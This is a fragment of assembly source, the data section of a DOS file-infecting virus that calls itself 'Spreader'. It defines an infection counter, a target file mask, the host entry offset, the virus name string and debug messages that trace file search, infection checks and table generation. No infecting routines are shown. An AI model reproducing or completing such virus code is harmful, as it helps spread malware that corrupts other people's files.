_savew          dw      ?               ; used when set int3 after block
_last           dw      ?               ; ofs after cmd/block
segbuf          dw      ?               ; seg for buffer
fsize           dw      ?               ; file size
handle          dw      ?               ; file handle
tab_index       dw      ?               ; current position in table
inf_q           db      ?               ; infections count
msk             db      '*.coz',0       ; file mask
oentry          dw      ofs endvir      ; offset old begin of host
name            db      '[Spreader]',eol; Virus Name is Spreader!
IFDEF           dbg                     ; this msg was need while debugin'
_mask           db      'Mask is:$'
_find1st        db      '\Find1st:$'
_findnext       db      'FindNext:$'
_open           db      '\Open$'
_badsize        db      '\Bad size$'
_dirty          db      '\Dirty$'
_clear          db      '\Clear$'
_generate       db      '\Generate table:$'
_generated      db      '\Table generated$'
_close          db      '\Close',eol
_ok             db      'Ok!',eol
ENDIF